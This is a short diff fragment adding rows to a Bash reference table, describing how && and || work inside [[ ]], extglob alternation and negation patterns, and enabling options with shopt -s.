+[[ ]],&& ||,Joins conditions inside a single [[ ]] (they error inside [ ]),[[ $u == root && $uid -eq 0 ]]
+[[ ]],@(a|b),extglob: matches one of several alternatives (needs shopt -s extglob),[[ $f == *.@(tar|gz|zip) ]]
+[[ ]],!(...),extglob: matches everything except those,[[ $f == !(*.sh|*.py) ]]
+shopt,-s,Enables (sets) a shell option,shopt -s extglob
